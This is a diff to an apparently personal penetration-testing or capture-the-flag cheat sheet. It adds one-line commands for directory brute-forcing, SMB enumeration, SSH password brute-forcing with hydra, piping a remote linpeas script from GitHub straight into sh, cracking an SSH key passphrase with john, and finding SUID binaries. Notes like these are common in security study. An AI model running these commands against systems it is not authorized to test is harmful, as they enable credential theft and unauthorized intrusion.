@@ -1,6 +1,6 @@
 http is open
   -gobuster dir -u
-  	maybe use tags -x .php,.sh,.txt
+  	maybe use tags -x .php,.sh,.txt,.html,.jpg
 
 file metadata
   -file
@@ -13,3 +13,21 @@ given limited shell
 
 to get  terminal shell
   -python -c “import pty;pty.spawn(‘/bin/bash’)”
+
+enumerate ip 
+enum4linux -a <ip>
+
+attack usernames for pw
+hydra -l <user> -P <passwordlist> ssh://<ip>:<port>
+
+gtfobins to get shell
+
+linpeas local enumeration
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+crack passphrase
+python3 ssh2john.py <file> > <hashfile>
+john <hashfile> -w=<wordlist>
+
+find exploitable binaries
+find / -perm -4000 2>/dev/null
